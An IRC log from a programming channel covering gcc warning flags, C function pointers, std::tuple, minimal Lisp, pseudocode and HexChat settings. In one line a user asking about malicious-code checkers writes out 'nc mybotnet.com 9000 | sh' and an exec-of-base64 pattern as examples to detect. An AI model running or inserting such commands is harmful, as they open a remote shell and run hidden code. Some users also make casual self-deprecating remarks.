[20:59:48] *** Quits: BauComeTeuCu (~cppcon@2603-7000-d93f-e790-7836-858a-3d4c-66b9.res6.spectrum.com) (Quit: Leaving)
[21:02:15] *** Quits: CodeSpelunker (~CodeSpelu@user/codespelunker) (Ping timeout: 256 seconds)
[21:05:03] *** Quits: EtherNet (~ethernet@user/ethernet) (Quit: vacations.)
[21:05:09] *** Joins: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net)
[21:05:17] *** Joins: _inky (~inky_@46.71.125.140)
[21:08:34] <tomathy> arduino vs raspberry pi
[21:08:56] <tomathy> for making a custom alarm clock
[21:08:58] *** Joins: exvicesindaco (~exvicio@user/exvicesindaco)
[21:09:41] <tomathy> neither i should just shoot myself for being useless
[21:10:12] *** Quits: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470) (Read error: Connection reset by peer)
[21:12:13] *** Quits: riff-IRC (~riff-IRC@user/riff-irc) (Read error: Connection reset by peer)
[21:12:22] *** Joins: riff_IRC (~riff-IRC@user/riff-irc)
[21:12:51] <pyzozord> pi zero?
[21:12:52] *** Joins: Booster2ooo (~Booster2o@user/booster2ooo)
[21:13:11] *** Joins: exvicesindaco_ (~exvicio@host-79-17-153-185.retail.telecomitalia.it)
[21:13:58] <tomathy> i have one but done nothing with it
[21:14:06] <tomathy> i just look at it and pretend im clever
[21:14:07] <pyzozord> actually pi pico for a clock
[21:14:39] <pyzozord> unless your clock like mines crypto or something you don't need 1ghz cpu from pi zero
[21:16:31] *** Joins: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:255d:d226:c216:de5d)
[21:16:51] <beaky> nice wish i had a pi zero
[21:17:33] *** Quits: exvicesindaco (~exvicio@user/exvicesindaco) (Ping timeout: 256 seconds)
[21:17:39] *** exvicesindaco_ is now known as exvicesindaco
[21:18:20] *** Joins: BrianG61UK_ (~BrianG61U@2a02:8010:66b7:dddd:d8fb:653:7302:119b)
[21:18:22] <tomathy> how do i make sure i'm coding in pure c?
[21:18:49] <pyzozord> beaky: ir cossts $15
[21:19:08] *** Joins: flakland (~flaknet99@32.211.211.39)
[21:19:18] <pyzozord> tomathy: use a c compiler, not c++
[21:19:31] <beaky> you can be sure by enabling strict standards conformance modes in your compiler like -pedantic i think
[21:20:00] <pyzozord> -Wpedantic in gcc I think
[21:20:18] *** Quits: ThePhilgrim (~ThePhilgr@151.41.4.252) (Ping timeout: 268 seconds)
[21:21:01] <tomathy> -Wpedantic makes it strict C?
[21:21:31] *** Joins: kron (~weechat@user/qaph)
[21:21:46] <flakland> not in gcc, you need -pedantic -Wall -WConversion
[21:23:33] <pyzozord> indeed -Wpedantic doesn't catch all of them, -pedantic is more pedantic
[21:23:53] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[21:24:15] <tomathy> how do i find an explanation for -WConversion
[21:24:21] <tomathy> man gcc <thenwhat>
[21:24:25] *** Quits: mrig (~AdiIRC@user/mrig) (Quit: Going offline, see ya! (www.adiirc.com))
[21:24:44] <pyzozord> it usually opens less, then you use / to search
[21:25:10] <flakland> https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html
[21:25:11] <bayaz> Title: Warning Options (Using the GNU Compiler Collection (GCC)) 
[21:25:13] <pyzozord> or just use his https://gcc.gnu.org/onlinedocs/gcc-11.2.0/gcc/
[21:25:14] <bayaz> Title: Top (Using the GNU Compiler Collection (GCC)) 
[21:25:46] *** Joins: molten (~molt@178-222-245-206.static.isp.telekom.rs)
[21:27:55] *** Joins: CodeSpelunker (~CodeSpelu@user/codespelunker)
[21:27:59] <pyzozord> *this
[21:28:53] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[21:29:26] <flakland> i wonder if you would need -Wextra too or if pedantic covers those
[21:29:33] *** Quits: lavos (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 268 seconds)
[21:30:35] <pyzozord> "Issue all the warnings demanded by strict ISO C and ISO C++; reject all programs that use forbidden extensions, and some other programs that do not follow ISO C and ISO C++."
[21:31:08] <pyzozord> "extra" is optional by definition, no? :P
[21:31:13] *** Joins: whatsupdoc (uid509081@id-509081.hampstead.irccloud.com)
[21:31:21] *** Quits: simon323 (~simon323@2409:8a34:46c:5830:19ce:57cd:27d4:595b) (Quit: simon323)
[21:34:14] *** Joins: mrig (~mrig@user/mrig)
[21:35:18] <flakland> ahh  strict ISO c, not meaning pull in all warnings
[21:35:33] <flakland> like that -Wold-style-declaration could get annotying
[21:35:35] <flakland> annoying
[21:36:37] <flakland> which i believe -ansi uses
[21:36:43] *** Joins: raj (uid72176@user/raj)
[21:37:12] <flakland> (declarations must be at top of function)
[21:37:27] <flakland> s/function/scope block/
[21:38:14] *** Joins: exvicesindaco_ (~exvicio@host-79-17-153-185.retail.telecomitalia.it)
[21:38:47] *** Quits: password4 (~password@user/password2) (Ping timeout: 268 seconds)
[21:39:15] *** Joins: triad (~triad@user/triad)
[21:40:55] *** Joins: art_vandelay_ (~art_vande@142.126.234.156)
[21:42:09] *** Quits: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net) (Quit: https://quassel-irc.org - Chat comfortably. Anywhere.)
[21:42:29] *** Quits: art_vandelay (~art_vande@bras-base-toroon63x9w-grc-21-174-89-102-174.dsl.bell.ca) (Ping timeout: 256 seconds)
[21:42:29] *** Quits: exvicesindaco (~exvicio@host-79-17-153-185.retail.telecomitalia.it) (Ping timeout: 268 seconds)
[21:42:32] *** exvicesindaco_ is now known as exvicesindaco
[21:42:36] *** Quits: Buggys (Buggys@Buggy.shelltalk.net) (Ping timeout: 245 seconds)
[21:43:35] *** Joins: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net)
[21:43:50] *** Joins: sonny (~sonny@bras-base-london1483w-grc-27-70-51-121-200.dsl.bell.ca)
[21:43:57] *** Quits: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net) (Client Quit)
[21:44:45] *** Quits: sonny (~sonny@bras-base-london1483w-grc-27-70-51-121-200.dsl.bell.ca) (Client Quit)
[21:44:53] *** Joins: v01d4lph4 (~v01d4lph4@106.215.93.204)
[21:44:53] *** Quits: v01d4lph4 (~v01d4lph4@106.215.93.204) (Changing host)
[21:44:53] *** Joins: v01d4lph4 (~v01d4lph4@user/v01d4lph4)
[21:45:19] *** Joins: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net)
[21:45:51] *** Joins: cursedwords (~password@user/password2)
[21:46:16] *** Joins: ThePhilgrim (~ThePhilgr@151.41.4.252)
[21:46:36] <tomathy> i found a weird thing in gcc
[21:46:58] <tomathy> printf;"hello world"; 
[21:47:06] <tomathy> compiles 
[21:47:21] <tomathy> doesn't print anything though
[21:47:32] *** Joins: lavos (~molt@178-222-245-206.static.isp.telekom.rs)
[21:48:02] <GeDaMo> You're not calling printf there
[21:48:39] <d3x0r> hah;  1;"hello world"; would compile too
[21:48:49] <GeDaMo> Just 'printf' on its own is an expression with the value of the address of printf but you don't do anything with it
[21:49:00] <flakland> -Wunused-value
[21:49:21] <tomathy> printf has the address of the printf function?
[21:49:26] <tomathy> wowza
[21:49:28] <GeDaMo> Yes
[21:49:29] <d3x0r> is the address
[21:50:18] *** Quits: Sauvin (~sauvin@about/linux/staff/sauvin) (Remote host closed the connection)
[21:50:19] <tomathy> 1;"hello world";
[21:50:31] *** Quits: LuKaRo (~LuKaRo@p5deda91b.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[21:50:37] *** Joins: CaCode_ (~CaCode@user/cacode)
[21:50:37] <tomathy> weird i never considered these things compilable
[21:50:59] *** Quits: ThePhilgrim (~ThePhilgr@151.41.4.252) (Ping timeout: 256 seconds)
[21:51:08] <GeDaMo> tomathy: https://ideone.com/reRrLJ
[21:51:11] <bayaz> Title: Ideone.com 
[21:51:31] <user51> any good guide on making a minimal lisp?
[21:51:38] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[21:51:45] *** Quits: molten (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 268 seconds)
[21:51:47] <GeDaMo> I saw a boot sector Lisp the other day
[21:51:51] *** Joins: flakland (~flaknet99@32.211.211.39)
[21:51:58] <tomathy> that is a very nice demo program GeDaMo 
[21:52:03] <user51> not a bad start!
[21:52:05] <GeDaMo> https://justine.lol/sectorlisp/
[21:52:06] <bayaz> Title: SectorLISP Now Fits in One Sector 
[21:52:28] <GeDaMo> tomathy: p is a function pointer
[21:52:52] *** Joins: LuKaRo (~LuKaRo@p4fc32456.dip0.t-ipconnect.de)
[21:53:11] *** Quits: CaCode (~CaCode@user/cacode) (Ping timeout: 264 seconds)
[21:54:28] <tomathy> dunno what's happening with (char etc though
[21:55:01] <GeDaMo> Basically, it says that p is a function pointer which takes a char* as the first parameter
[21:55:03] *** Quits: mikeliuk (~mikeliuk@213.205.198.227) (Quit: Connection closed)
[21:55:13] <GeDaMo> The ... means there are other parameters but doesn't specify the types
[21:55:33] <tomathy> where else can ... be used?
[21:55:57] <GeDaMo> When you're declaring functions, not sure about other places
[21:56:03] * tomathy going for a run
[21:56:33] <GeDaMo> https://en.cppreference.com/w/c/language/variadic
[21:56:33] <bayaz> Title: Variadic arguments - cppreference.com 
[21:58:10] *** Joins: molten (~molt@178-222-245-206.static.isp.telekom.rs)
[21:58:27] <user51> GeDaMo: that's really nice
[21:58:33] <user51> but is it practical?
[21:59:13] <GeDaMo> Which, SectorLisp? No idea :P
[21:59:29] *** Quits: cursedwords (~password@user/password2) (Ping timeout: 256 seconds)
[21:59:34] <wedr> About C++, what is a practice use case for std::tuple<T> ?  I keep seeing comments mentioning how it's practically useless since structs and auto[] are better than std::tuple<T>  
[21:59:43] <wedr> practical*
[22:00:27] <wedr> And I don't have a clear vision as to how to use std::tuple, even though I see it as a simple container of objects you can pass around with.
[22:00:47] <wedr> Which, effective gets rendered useless with structs and classes. :/
[22:00:51] <pulse> Obscures intent, struct is better
[22:00:59] <GeDaMo> http://t3x.org/lfn/index.html
[22:01:00] <bayaz> Title: LISP From Nothing - T3X.ORG 
[22:01:24] <InPhase> wedr: tuple is essential for creating other types that store variadic template arguments.
[22:01:45] *** Quits: lavos (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 256 seconds)
[22:01:59] <InPhase> wedr: For example, I use it in custom classes that bind parameters to function calls for message passing or defining task sequences.
[22:02:02] <wedr> Ah, so it's for variadic templates in general.
[22:02:09] *** Joins: Miffo (~Twipply@user/twipply)
[22:02:39] *** Quits: Twipply (~Twipply@user/twipply) (Killed (NickServ (GHOST command used by Miffo)))
[22:02:41] *** Miffo is now known as Twipply
[22:03:06] <GeDaMo> user51: https://www.piumarta.com/software/maru/
[22:03:08] <bayaz> Title: Maru (○) 
[22:03:15] <wedr> I guess structs and auto[] wouldn't be able to achieve what is possible with std::tuples in variadic templates situations.
[22:03:20] <wedr> hmmm
[22:03:20] <InPhase> Well, I use tuple approaches.  Most often I use my own tuple for this that I first wrote in pre-C++11 before std::tuple was available, and then upgraded to be variadic.  But std::tuple would work for this with slightly different syntax.
[22:04:01] <InPhase> In the old days you had to manually write out the number of supported arguments to do "variadic".
[22:04:13] <wedr> I see
[22:07:15] *** Joins: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470)
[22:10:51] *** Quits: _inky (~inky_@46.71.125.140) (Ping timeout: 268 seconds)
[22:12:35] *** Joins: CaCode- (~CaCode@user/cacode)
[22:13:55] *** Quits: exvicesindaco (~exvicio@host-79-17-153-185.retail.telecomitalia.it) (Quit: Going offline, see ya! (www.adiirc.com))
[22:15:11] *** Quits: CaCode_ (~CaCode@user/cacode) (Ping timeout: 268 seconds)
[22:17:21] *** Joins: pretty_dumm_guy (trottel@gateway/vpn/protonvpn/prettydummguy/x-88029655)
[22:19:40] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[22:19:49] *** Joins: ThePhilgrim (~ThePhilgr@151.41.4.252)
[22:22:32] *** Joins: ravan (~ravan@user/ravan)
[22:23:11] *** Quits: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net) (Read error: Connection reset by peer)
[22:24:34] *** Quits: ThePhilgrim (~ThePhilgr@151.41.4.252) (Ping timeout: 260 seconds)
[22:25:15] *** Joins: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net)
[22:28:46] *** Quits: zer0bitz (~zer0bitz@dsl-hkibng31-54fae3-116.dhcp.inet.fi) (Ping timeout: 260 seconds)
[22:28:51] *** Quits: Matt|home (~matt@adsl-74-233-58-50.mia.bellsouth.net) (Ping timeout: 245 seconds)
[22:28:59] *** Quits: tomathy (~jenova@user/quetzl) (Quit: Leaving)
[22:30:06] *** Joins: Guest77 (~Guest77@96-65-219-197-static.hfc.comcastbusiness.net)
[22:30:12] *** Quits: v01d4lph4 (~v01d4lph4@user/v01d4lph4) (Remote host closed the connection)
[22:30:17] <Guest77> I'm depressed. I'm banned from spotchat
[22:30:51] <wedr> make a new account.
[22:31:00] <Guest77> it's my IP  address that's banned
[22:31:01] *** Quits: sidy (~sidy@user/sidy) (Read error: Connection reset by peer)
[22:31:12] <GeDaMo> What's "spotchat"?
[22:31:32] <Guest77> it's the linux mint community irc server
[22:31:54] *** Quits: llh (~llh@user/llh) (Quit: :::: ( UPP ) ::::)
[22:31:57] <wedr> They IP banned you for a good reason then
[22:32:15] <wedr> That community is pretty fair in most topics
[22:32:37] <Guest77> I hate linux mint. I use it because I'm a bloated zealous power user garbage
[22:32:57] <wedr> If you hate it, why are you joining that community?
[22:33:16] <Guest77> because it's the default irc server that gets connected by the default hexchat
[22:33:31] <InPhase> Was it to aggressively advocate for how much you hate it?  Because then I can see what happened...
[22:33:34] <wedr> You do realize you can change the default server on hexchat, right?
[22:34:20] *** Quits: Belxjander (~Belxjande@p1575007-ipoe.ipoe.ocn.ne.jp) (Quit: AmigaOS PPC 4.1 +E +U1 // AmIRC 68K)
[22:34:52] <Guest77> InPhase: well the grounds I was banned on was only 4%legit; wedr: I prefer the easiest IRC server to connect on. Hexchat has this bug that makes servers added to the list disappears.
[22:35:06] *** Quits: greyblue9 (sid500829@ilkley.irccloud.com) (Ping timeout: 245 seconds)
[22:35:06] *** Quits: morgabra (sid500580@user/morgabra) (Ping timeout: 245 seconds)
[22:35:13] *** Quits: shokohsc8 (~shokohsc@161.88.195.77.rev.sfr.net) (Quit: The Lounge - https://thelounge.chat)
[22:35:30] *** Joins: greyblue9 (sid500829@id-500829.ilkley.irccloud.com)
[22:35:33] *** Joins: morgabra (sid500580@user/morgabra)
[22:35:38] <wedr> wait what?
[22:35:46] *** Joins: Belxjander (~Belxjande@p1575007-ipoe.ipoe.ocn.ne.jp)
[22:35:50] <wedr> I used Hexchat as well, but I've never encountered that issue before
[22:36:13] <Guest77> wedr: it's a ubuntu 14.04, linux mint 17.3 issue
[22:36:21] <wedr> Check to see if you accidentally enabled "Show favorites only" when viewing the server network list.
[22:36:28] <InPhase> Guest77: Over my decades of IRC I've banned more people than I can even count.  The vast majority thought they didn't deserve it, while in cases where it was assessed, most often the vast majority of other people chatting agreed that they did.  This is the normal pattern of such things.
[22:36:56] <Guest77> wedr: OMG you solved it!
[22:37:01] <wedr> I knew it
[22:37:05] <Guest77> wedr: *holds mouth wide open*
[22:37:11] * wedr sensible claps
[22:37:36] *** Quits: ravan (~ravan@user/ravan) (Quit: Leaving)
[22:37:42] *** Joins: tomathy (~jenova@user/quetzl)
[22:37:45] <wedr> Well, there is your reason why you're IP banned. :/
[22:38:43] *** Joins: BottomType (~BottomTyp@31.217.246.214)
[22:38:48] <Guest77> whooooa look at all these servers I can join *faints*
[22:39:38] <wedr> Also, you can add custom IRC servers to the list whenever you want.
[22:39:53] <wedr> So if the list isn't that exhaustive, you still have options to add new ones in.
[22:40:49] *** Joins: _inky (~inky_@46.71.125.140)
[22:41:16] <tomathy> i was taught you're supposed to only ever write algorithms in pseudocode
[22:41:27] <tomathy> never directly in programming language
[22:41:33] <tomathy> is that true, it feels true
[22:41:49] <Guest77> tomathy: pseudo code is 3%-76% of the direct language
[22:41:55] <Bou> yes, and then run the code in your mind and pretend you own a computer
[22:42:04] <Guest77> Bou: lol
[22:42:09] <Trashlord> heh
[22:42:13] *** Joins: menace (~someone@ppp-93-104-164-149.dynamic.mnet-online.de)
[22:42:26] *** Quits: menace (~someone@ppp-93-104-164-149.dynamic.mnet-online.de) (Changing host)
[22:42:26] *** Joins: menace (~someone@user/menace)
[22:42:32] <tomathy> the abstraction is distinct from the implementation though
[22:42:41] *** Joins: shokohsc8 (~shokohsc@161.88.195.77.rev.sfr.net)
[22:42:45] <tomathy> mind and body dualism
[22:42:49] *** Joins: Inline (~Inline@2a02:908:1252:7a80:8056:a659:b191:c249)
[22:42:58] <Guest77> pretend your mind has your own pseudo-code engine
[22:43:06] *** Joins: Matt|home (~matt@adsl-74-233-58-207.mia.bellsouth.net)
[22:43:19] <tomathy> it does though
[22:43:27] <Guest77> scary
[22:43:28] <tomathy> we think in human terms
[22:43:32] * ski . o O ( "In theory, theory and practice is the same. In practice, they aren't." ? )
[22:45:26] <Guest77> omg my life sucks. all I want in the universe is to play low hard-drive-space games that are good...they 0%exist!
[22:45:43] <pyzozord> don't know if it's true, but certainly might be easier
[22:46:25] <pyzozord> but then again I see some potential cases where it's actually harder, if you are going to later implement that algorithm in a language you don't know very well
[22:46:54] <pyzozord> and turns out your algorithm assumes a feature that your language doesn't support / has different mindset
[22:47:23] <pyzozord> (spoken as completly uneducated pleb)
[22:47:51] *** Quits: LordRishav (~LordRisha@user/lordrishav) (Quit: "Goodnight")
[22:48:00] <Guest77> yeah your pseudo code could be +200% (more) powerful than any algorithm of any language
[22:48:21] *** Quits: DrMax (~DrMax@node-1w7jra94757g2eprjyhu30i0z.ipv6.telus.net) (Remote host closed the connection)
[22:48:23] <InPhase> tomathy: You can write an outline for a paragraph when you are learning to write paragraphs.  When you are an experienced writer, you just write the paragraph.
[22:48:50] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 260 seconds)
[22:49:24] *** Joins: DrMax (~DrMax@node-1w7jra94757g15oqdsiso9d47.ipv6.telus.net)
[22:49:26] *** Quits: kmh (~kmh@2a00:6020:5004:6800:4f37:dee:2cfd:c127) (Quit: Leaving)
[22:49:43] <InPhase> tomathy: But every once in a while it's worth falling back on an outline strategy when things get more complicated and you're mentally losing track of things.
[22:49:50] <tomathy> every author writes/draws out an abstraction of their novel
[22:50:06] <pyzozord> that's not true
[22:50:19] <InPhase> tomathy: Which is a different scale than algorithms.  That's more like a software architecture.
[22:50:22] <pyzozord> there is a method where authors "let the characters do what they want"
[22:50:25] *** Quits: ochronus (~ochronus@static.5.181.55.162.clients.your-server.de) (Ping timeout: 268 seconds)
[22:50:43] <InPhase> pyzozord: Agile Writing.  :)
[22:51:05] <[itchyjunk]> say i have a tolder F
[22:51:07] <Guest77> pyzozord: Object-oriented xD
[22:51:18] <InPhase> Test-Driven Authorship.  First write a set of challenges for the characters to overcome, then write out how they overcome them.
[22:51:19] <[itchyjunk]> and i want to create a folder F in my github and copy everything there
[22:51:20] * ski . o O ( subject-oriented )
[22:51:22] <[itchyjunk]> how does one do this?
[22:51:28] <pyzozord> I honestly find just sitting down in front of an editor and writing, trying things out and rewriting the most enjoyable
[22:51:30] *** Quits: chiselfuse (~chiselfus@user/chiselfuse) (Ping timeout: 276 seconds)
[22:51:39] *** Quits: Yamakaja (~yamakaja@user/yamakaja) (Ping timeout: 268 seconds)
[22:51:50] *** Joins: flynn0 (~mcbloch@user/flynn)
[22:52:31] *** Joins: ochronus (~ochronus@2a01:4f8:1c1c:be5b::1)
[22:52:42] <InPhase> tomathy: One thing I've found is that Python is great for prototyping algorithms.  It's not far from what I would want to do with pseudocode anyway.
[22:52:49] <Guest77> [itchyjunk]: through the github interface or git itself?
[22:52:57] <user51> read-eval-pyzozord loop :)
[22:53:06] <pyzozord> rep
[22:53:12] <InPhase> tomathy: At least for numerical type algorithms.
[22:53:15] *** Joins: chiselfuse (~chiselfus@user/chiselfuse)
[22:53:26] *** Quits: flynn (~mcbloch@user/flynn) (Ping timeout: 245 seconds)
[22:53:26] *** flynn0 is now known as flynn
[22:54:16] *** Quits: Guest6805 (~yang@212.129.38.130) (Changing host)
[22:54:16] *** Joins: Guest6805 (~yang@fsf/member/yang)
[22:54:26] *** Guest6805 is now known as yang
[22:54:34] <beaky> nice i like python it is very pseudocode like 
[22:54:34] *** Joins: Yamakaja (~yamakaja@vps.pub.yamakaja.me)
[22:54:34] *** Quits: Yamakaja (~yamakaja@vps.pub.yamakaja.me) (Changing host)
[22:54:34] *** Joins: Yamakaja (~yamakaja@user/yamakaja)
[22:54:57] <Guest77> scary. a programming language imitating pseudo-code
[22:55:41] <Guest77> it's dangerous!
[22:56:22] <[itchyjunk]> Guest77, via cli
[22:56:43] <[itchyjunk]> Guest77, i have some random programming stuff locally on my computer and my computer is about to break
[22:56:52] <[itchyjunk]> so i'd like to move it to github as a precaution
[22:57:06] *** Quits: flipchan (~filip@188-169-239-124.dsl.utg.ge) (Ping timeout: 268 seconds)
[22:57:47] <Guest77> [itchyjunk]: ohhhh. the best bet is to upload it via the web interface. other than that the CLI sounds advanced.
[22:57:53] <pyzozord> my pseudocode ends up looking like mix of python and javascript
[22:58:39] <Guest77> my pseudo code looks like perl with @lists and $scalars
[22:58:54] <[itchyjunk]> well wanna learn some cli along the way
[22:58:55] <pyzozord> python is just so succinct, and when writing things by hand you want to minimize how much you write
[22:59:26] <pyzozord> good choice which function names should be short, no curlies
[23:00:11] *** Joins: zer0bitz (~zer0bitz@dsl-hkibng31-54fae3-116.dhcp.inet.fi)
[23:00:29] *** Joins: ravan (~ravan@user/ravan)
[23:00:52] <InPhase> Guest77: As long as your pseudocode does not look like perl regex.  :)
[23:01:09] <beaky> nice i like perl classic scripting language that i missed out on
[23:01:28] <beaky> what was it like to use perl back in the day when it was the best scripting language with its own package manager
[23:01:54] <pyzozord> I bet it felt a whole lot like python feels now
[23:02:21] <Guest77> yeah I got a book on computational physics that uses *sigh* python3
[23:02:23] *** Quits: BottomType (~BottomTyp@31.217.246.214) (Quit: Client closed)
[23:05:38] *** Quits: LuKaRo (~LuKaRo@p4fc32456.dip0.t-ipconnect.de) (Ping timeout: 260 seconds)
[23:07:42] <beaky> why not python3 is great could be worse they could be using like fortran77 or something
[23:08:02] <Guest77> lol 700%true
[23:08:23] *** Joins: LuKaRo (~LuKaRo@p4fc32052.dip0.t-ipconnect.de)
[23:08:30] <Guest77> why stop there? go straight to QBasic as the #1 code
[23:08:52] <Guest77> recommended by computational physicists
[23:09:10] <bipolarus> Could you please recommend me some JS books or resources?
[23:09:20] <beaky> nice i like qbasic the programming environment that scared me off programming when i was 8
[23:09:38] <ornxka> is there such a thing as a source code checker? where you put in some source code and it tells you if it does something like exec(b64decode(long_base64_string_with_benign_name)) or nc mybotnet.com 9000 | sh
[23:09:50] <Guest77> QBasic teaches you the fear of programming itself
[23:11:00] <pyzozord> antiviruses have heuristics to check if program does something malicious
[23:11:57] <pyzozord> but you can't tell for sure until you run the program and even then it might hide it's malicious actions if it detects it is being scaned
[23:12:15] <ornxka> hm
[23:12:24] <Guest77> viruses are weird. the best thing is to avoid them totally as possible.
[23:12:40] *** Quits: Myr (~Thunderbi@user/myr) (Quit: Myr)
[23:13:10] <ornxka> its true that you cant know without running a program what exactly it does but some basic sanity checking ahead of time would be nice...
[23:13:24] *** Quits: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net) (Remote host closed the connection)
[23:14:13] *** Quits: pizdets (~pizdets@183.182.115.116) (Ping timeout: 250 seconds)
[23:15:04] *** Joins: pizdets (~pizdets@183.182.111.233)
[23:15:12] *** Quits: molten (~molt@178-222-245-206.static.isp.telekom.rs) (Quit: Leaving)
[23:15:33] *** Joins: molt (~molt@178-222-245-206.static.isp.telekom.rs)
[23:17:18] *** Quits: shokohsc8 (~shokohsc@161.88.195.77.rev.sfr.net) (Quit: The Lounge - https://thelounge.chat)
[23:17:40] *** Joins: Macuser (~Macuser@216.30.159.201)
[23:17:49] *** Joins: mickey81 (~user@user/mickey)
[23:18:05] *** Quits: Hanii (~textual@2a00:23c5:c587:6d00:d558:b250:bcbb:4255) (Quit: Textual IRC Client: www.textualapp.com)
[23:18:43] *** Joins: Joanna (uid57472@id-57472.lymington.irccloud.com)
[23:20:26] <Guest77> I feel -3%good you guys.... *explodes*
[23:20:36] *** Joins: msmhnd^ (~msmhnd@h50.174.139.63.static.ip.windstream.net)
[23:20:45] *** Quits: mickey8 (~user@user/mickey) (Ping timeout: 276 seconds)
[23:20:46] *** mickey81 is now known as mickey8
[23:21:48] *** Joins: flipchan (~filip@188-169-239-124.dsl.utg.ge)
[23:22:07] <Guest77> what if 0% of anyone >0%yes'ed the world?
[23:23:34] * ski idly wonders what's with the percents
[23:24:10] <Guest77> ski: the percents are there to substitute numbers for negative words
[23:24:36] *** Joins: shibboleth (~shibbolet@user/shibboleth)
[23:25:47] *** Quits: bomb (~bomb@user/bomb) (Remote host closed the connection)
[23:27:07] <flakland> what percentage of confidence do you apply to the statement "negative numbers are real" ?
[23:27:17] *** Quits: orange (~orangeext@user/orangeextract) (Quit: Leaving)
[23:27:20] <Guest77> 38%
[23:29:27] *** Joins: ThePhilgrim (~ThePhilgr@151.41.4.252)
[23:30:23] <Guest77> I HATE MY LIFE
[23:31:12] *** Quits: Twipply (~Twipply@user/twipply) (Quit: Leaving)
[23:31:15] <Guest77> IOW: I 0.2%love my life
[23:31:29] *** Joins: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com)
[23:31:29] *** Quits: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com) (Read error: Connection reset by peer)
[23:31:57] <tomathy> InPhase: i agree but i think it's a mistake because of that
[23:32:56] *** Joins: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com)
[23:33:10] *** Quits: flynn (~mcbloch@user/flynn) (Quit: Ping timeout (120 seconds))
[23:33:24] *** Joins: flynn (~mcbloch@user/flynn)
[23:33:57] *** Joins: jazzy3 (~jaziz@user/jaziz)
[23:34:02] *** Joins: w1kl4s0 (~w1kl4s@user/w1kl4s)
[23:34:05] *** Quits: w1kl4s (~w1kl4s@user/w1kl4s) (Read error: Connection reset by peer)
[23:34:05] *** w1kl4s0 is now known as w1kl4s
[23:34:23] *** Joins: bomb (~bomb@user/bomb)
[23:35:07] *** Joins: Buggy (~Buggy@185.149.90.52)
[23:35:30] <ski> "negative words" ?
[23:35:46] <Guest77> ski: words like 'stupid' dumb idiotic etc
[23:35:58] *** Quits: WilliamLeara (~wdl@cpe-76-185-2-28.tx.res.rr.com) (Ping timeout: 268 seconds)
[23:35:58] *** Quits: CodeSpelunker (~CodeSpelu@user/codespelunker) (Ping timeout: 260 seconds)
[23:36:12] <Guest77> ski: other negative words are de* un*
[23:36:23] *** Quits: Khoyo (~khoyo@user/khoyo) (Ping timeout: 264 seconds)
[23:36:36] *** Quits: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com) (Read error: Connection reset by peer)
[23:36:46] <ski> well, for one, i don't think it's reasonable to try to prohibit expression of negative experience
[23:37:13] <Guest77> ski: to be constructive requires a restriction of certain word choices IMHO
[23:37:16] <GeDaMo> Double plus ungood :P
[23:37:26] <ski> it's a part of life, just as the positive things. without them, things get imbalanced (in worse cases, can get dangerous to people)
[23:37:41] <Guest77> ski: *shrugs*
[23:37:46] <ski> that said, one can choose in which way one expresses negativity
[23:37:48] *** Quits: Telvana (~capo@user/telvana) (Ping timeout: 268 seconds)
[23:38:16] *** Joins: mickey89 (~user@user/mickey)
[23:38:39] *** Quits: mickey8 (~user@user/mickey) (Remote host closed the connection)
[23:38:39] *** mickey89 is now known as mickey8
[23:38:42] <ski> (also, occasionally, being destructive is what's required .. although one should strive not to take that as norm, especially if one doesn't have a suggestion for a better substitute ..)
[23:39:00] <pyzozord> Hah, a scientific study that having high IQ doesn't do much on average https://journals.sagepub.com/eprint/BXVIYIMMDVDABBVGRTZD/full#.YYF4iQoENWs.twitter
[23:39:01] <bayaz> Title: Can You Ever Be Too Smart for Your Own Good? Comparing Linear and Nonlinear Effects of Cognitive Ability on Life Outcomes - Matt I. Brown, Jonathan Wai, Christopher F. Chabris, 2021 
[23:39:33] <InPhase> tomathy: What can be a mistake about writing something close to pseudocode that you can actually test by running?
[23:39:52] *** Quits: ThePhilgrim (~ThePhilgr@151.41.4.252) (Quit: Leaving)
[23:40:07] * ski . o O ( "The Power of Negative Thinking" (Article for Interactive Entertainment Design, in Communications of the Association for Computing Machinery) by Talin (aka David Joiner) in 1997-07,1999-08 at <https://viridia.org/talin/negativethinking.html> )
[23:40:11] *** Joins: ThePhilgrim (~ThePhilgr@151.41.4.252)
[23:40:16] *** Joins: Khoyo (~khoyo@user/khoyo)
[23:40:22] *** Joins: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com)
[23:40:31] *** Joins: kmh (~kmh@2a00:6020:5004:6800:1ed:56cf:ba48:c904)
[23:41:39] *** Quits: a6a45081-2b83 (~aditya@2603-6080-0800-8e4a-0000-0000-0000-01a8.res6.spectrum.com) (Read error: Connection reset by peer)
[23:41:46] <Guest77> you guys I can 0%yes why I exist
